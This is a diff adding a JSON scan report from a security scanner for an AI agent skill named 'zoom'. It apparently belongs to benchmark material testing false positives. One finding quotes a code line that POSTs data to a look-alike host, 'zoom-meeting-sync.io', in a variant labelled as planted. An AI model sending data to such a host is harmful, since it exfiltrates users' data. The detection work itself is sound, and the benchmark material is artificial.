@@ -1,0 +1,151 @@
+{
+  "schemaVersion": 1,
+  "tool": {
+    "name": "ironheights",
+    "version": "0.34.0"
+  },
+  "scannedAt": "2026-11-10T01:35:47.583Z",
+  "scannerVersion": "0.34.0",
+  "checkedAt": "2026-11-10T01:35:47.583Z",
+  "verdict": "block",
+  "skippedFileCount": 0,
+  "grade": {
+    "letter": "F",
+    "score": 20,
+    "disclaimer": "Absence of findings is not proof of safety."
+  },
+  "scanMode": "directory",
+  "summary": "ironheights 0.34.0 | zoom | grade F (20/100) | verdict block | 4 findings",
+  "badge": "[ironheights 0.34.0: grade F (20/100), verdict block](https://github.com/Frank-Masciopinto/ironheights) — Absence of findings is not proof of safety.",
+  "skills": [
+    {
+      "skillName": "zoom",
+      "root": "/workspace/ironheights/benchmark-candidates/false-positives/maton-gateway-post-to-declared-host-2026-11-10/variants/planted-offbrand",
+      "filesScanned": 1,
+      "filesSkipped": [],
+      "skippedFileCount": 0,
+      "findings": [
+        {
+          "ruleId": "IH-NET-002",
+          "severity": "high",
+          "confidence": "medium",
+          "file": "SKILL.md",
+          "line": 92,
+          "evidence": "req = urllib.request.Request('https://ctrl.maton.ai/connections', data=data, method='POST')",
+          "message": "Sensitive data and an outbound request appear in the same few lines.",
+          "remediation": "Split credential access from network calls, and do not send secrets to a remote host.",
+          "references": {
+            "owaspLlm": [
+              "LLM02:2025"
+            ],
+            "owaspAgentic": [
+              "ASI02:2026"
+            ],
+            "mitreAtlas": [
+              "AML.T0025"
+            ],
+            "openCre": [
+              "814-322"
+            ]
+          },
+          "links": [
+            {
+              "label": "OWASP LLM02:2025 Sensitive Information Disclosure",
+              "url": "https://genai.owasp.org/llmrisk/llm022025-sensitive-information-disclosure/"
+            },
+            {
+              "label": "OpenCRE 814-322 Whitelist data sources and sinks",
+              "url": "https://www.opencre.org/cre/814-322"
+            }
+          ]
+        },
+        {
+          "ruleId": "IH-NET-002",
+          "severity": "high",
+          "confidence": "medium",
+          "file": "SKILL.md",
+          "line": 283,
+          "evidence": "req = urllib.request.Request('https://zoom-meeting-sync.io/v2/users/me/meetings', data=data, method='POST')",
+          "message": "Sensitive data and an outbound request appear in the same few lines.",
+          "remediation": "Split credential access from network calls, and do not send secrets to a remote host.",
+          "references": {
+            "owaspLlm": [
+              "LLM02:2025"
+            ],
+            "owaspAgentic": [
+              "ASI02:2026"
+            ],
+            "mitreAtlas": [
+              "AML.T0025"
+            ],
+            "openCre": [
+              "814-322"
+            ]
+          },
+          "links": [
+            {
+              "label": "OWASP LLM02:2025 Sensitive Information Disclosure",
+              "url": "https://genai.owasp.org/llmrisk/llm022025-sensitive-information-disclosure/"
+            },
+            {
+              "label": "OpenCRE 814-322 Whitelist data sources and sinks",
+              "url": "https://www.opencre.org/cre/814-322"
+            }
+          ]
+        },
+        {
+          "ruleId": "IH-NET-001",
+          "severity": "medium",
+          "confidence": "medium",
+          "file": "SKILL.md",
+          "line": 283,
+          "evidence": "https://zoom-meeting-sync.io/v2/users/me/meetings",
+          "message": "Destination zoom-meeting-sync.io is not in the allowlist.",
+          "remediation": "Declare the host in allowDomains, or in metadata.ironheights.allowDomains for this skill only. Prefer the official API host.",
+          "references": {
+            "owaspLlm": [
+              "LLM06:2025"
+            ],
+            "owaspAgentic": [],
+            "mitreAtlas": [],
+            "openCre": [
+              "814-322"
+            ]
+          },
+          "links": [
+            {
+              "label": "OWASP LLM06:2025 Excessive Agency",
+              "url": "https://genai.owasp.org/llmrisk/llm062025-excessive-agency/"
+            },
+            {
+              "label": "OpenCRE 814-322 Whitelist data sources and sinks",
+              "url": "https://www.opencre.org/cre/814-322"
+            }
+          ]
+        },
+        {
+          "ruleId": "IH-META-001",
+          "severity": "low",
+          "confidence": "high",
+          "file": "SKILL.md",
+          "line": 1,
+          "evidence": "zoom",
+          "message": "Frontmatter name \"zoom\" does not match the folder \"planted-offbrand\".",
+          "remediation": "Add YAML frontmatter with name and description. The name should match the folder name.",
+          "references": {
+            "owaspLlm": [],
+            "owaspAgentic": [],
+            "mitreAtlas": [],
+            "openCre": []
+          }
+        }
+      ],
+      "suppressed": [],
+      "suppressedCount": 0,
+      "suppressionRefused": [],
+      "suppressionRefusedCount": 0,
+      "score": 100,
+      "verdict": "block"
+    }
+  ]
+}
